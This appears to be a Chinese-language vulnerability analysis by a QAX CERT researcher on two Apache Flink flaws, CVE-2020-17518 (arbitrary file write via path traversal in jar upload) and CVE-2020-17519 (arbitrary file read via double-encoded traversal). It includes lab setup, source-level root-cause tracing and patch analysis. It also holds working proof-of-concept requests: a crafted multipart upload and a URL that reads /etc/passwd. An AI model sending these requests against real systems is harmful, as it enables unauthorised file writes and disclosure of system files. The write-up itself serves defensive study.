**作者： Veraxy@QAX CERT  
原文链接：**
**Apache Flink** 是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。
# 0x01 环境搭建
个人喜欢手动搭建环境，已有相关漏洞环境的盆友可越过这节，直接看漏洞部分。
1. **JDK装好**
2. **安装Flink**
安装包地址：
为同时满足两个漏洞环境，这里安装1.11.2版本
解压缩
    # tar -zxvf flink-1.11.2-bin-scala_2.11.tgz
修改配置文件conf/flink-conf.yaml中jobmanager.rpc.address参数为本地服务器IP地址
    # vim conf/flink-conf.yaml
    jobmanager.rpc.address: 192.168.18.169
并添加远程调试参数：
    # vim conf/flink-conf.yaml
    # jobmanager debug端口
    env.java.opts.jobmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5006"
    # taskmanager debug端口
    env.java.opts.taskmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
3. **启动Flink服务**
    # cd bin
    # ./start-cluster.sh
看看开放了哪些端口：5005、5006是配置的debug端口，8081是webUI访问端口，6123是JobMamanger进行RPC通信的端口
访问服务
**停止Flink服务：**
flink启动会把启动的进程的ID存到一个文件中，相关配置在bin/config.sh文件中，默认是“/tmp”，由于是临时目录，会被系统清理，存放的进程ID就找不到了，也就没法关闭集群了。
**直接执行关闭指令，会发现关闭不了**
    # cd bin
    # ./stop-cluster.sh?
**怎么做？**
新建一个目录 /usr/local/flink-1.11.2/tmp 来存放启动的进程的ID
修改bin/config.sh文件，为 **DEFAULT_ENV_PID_DIR** 指定为新建的路径
    DEFAULT_ENV_PID_DIR="/usr/local/flink-1.11.2/tmp"?
重新执行关闭指令：
    # ./stop-cluster.sh?
# 0x02 远程调试
上文远程Flink服务的配置文件 **flink-conf.yaml** 中已经配好了远程调试参数，开启了5005、5006调试端口。
本地IDEA打开该版本源码：
创建Remote配置，指定Host和Port，这里调试jobmanager，选择对应的端口
开启远程调试
# 0x03 CVE-2020-17518
Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的
HTTP 头将这些文件写入到?Flink 1.5.1 可以访问的任意位置。
**影响范围：** 1.5.1 
  * 
## **快速复现**
1. **利用一：文件上传**
编辑请求数据包，上传 /tmp/veraxy 文件
    POST /jars/upload HTTP/1.1
    Host: 192.168.18.169:8081
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477
    Content-Length: 248
    Origin: http://192.168.18.169:8081
    Connection: close
    Referer: http://192.168.18.169:8081/
    -----------------------------13247690941547071692111317477
    Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/veraxy"
    Content-Type: text/plain
    Veraxy!!!
    -----------------------------13247690941547071692111317477--
2. **利用二：文件** **覆盖**
若上传路径已有文件，将覆盖其内容。
## 漏洞分析
查看该漏洞相关[邮件](https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E)，已经指出commit地址
移步[commit](https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4)，上传功能的校验问题，并指出有两个测试案例
测试代码再次给出提示，修改文件名添加 **../**
找到系统的上传功能
传个测试文件，是/jars/upload接口
[官方文档](https://ci.apache.org/projects/flink/flink-docs-release-1.11/monitoring/rest_api.html)对该接口的使用说明
在处理上传路径的地方打断点
获取filename
resolve()解析方法接收filename，与系统路径拼接
dest存储拼接后上传路径，传给 fileUpload.renameTo()方法
上传文件，并重命名保存至另一个路径以做缓存
缓存文件存在时间很短，只有30s
此时系统按目标路径写入文件
## **补丁分析**
对上传路径做了处理
org.apache.flink.runtime.rest.FileUploadHandler#channelRead0()
对传入的filename进行截断，只取末尾的文件名，传递的../ 和目录名均被忽略
resolve()方法接收到的文件名只有结尾部分，与系统路径拼接后返回
赋值给dest路径变量，执行重命名缓存行为并上传文件
# 0x04 CVE-2020-17519
Apache Flink
1.11.0中引入的更改（包括1.11.1和1.11.2）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。
**影响范围：** Apache Flink 1.11.0、1.11.1、1.11.2
**参考链接：**
  * 
  * 
## **快速复现**
遍历文件/etc/passwd：
    http://192.168.18.171:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
## 漏洞分析
查看该漏洞相关[邮件](https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E)，同样指出commit地址
移步[commit](https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801)，细节描述的很清晰了，指出通过二次编码后的
'..%252f' 来替换 '../' 可以遍历logs文件夹的目录结构，比如："/jobmanager/logs/..%252f/README.txt"
将返回README.txt的内容
文档找一下 **/jobmanager/logs** 接口说明
发送请求
    http://192.168.18.169:8081/jobmanager/logs/..%252f..%252f..%252f..%252fetc%252fpasswd
系统接收请求，对request进行解析，初始化HandlerRequest对象
routedRequest.getRouteResult()获取result，decodedPath为一次解码后，pathParams存放二次解码后结果
将HandlerRequest传递给org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile，获取pathParams中存放的filename，拼接logDir返回路径。
读取文件内容作为响应。
## 不懂就问
**routedRequest.getRouteResult()获取的result是如何初始化的？包括其中的解码流程。**
回溯到org.apache.flink.runtime.rest.handler.router.RouterHandler#channelRead0()，这里routeResult为后面routedRequest中this.result原型，看routeResult如何初始化
url一次解码的地方，赋值给this.path返回
将method、path、queryParameters传送给router.route()方法来初始化一个routeResult对象
其中decodePathTokens(path)将path进行了二次解码，与此同时会判断路径中的“/”并截断，我们传入“/”的编码形式免于拦截，随后的for循环中再次进行解码，成功返回一个正常路径。
## 补丁分析
跟17518修复方式一致，通过File.getName()只取默认文件名
org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile方法，
路径中的../和目录名都被忽略，filename只剩下了文件名
# 总结
Apache Flink 服务大多开放在内网，漏洞影响面不算太大，但大数据时代随着该应用的使用量日益增多，其漏洞还是值得重视的。
* * *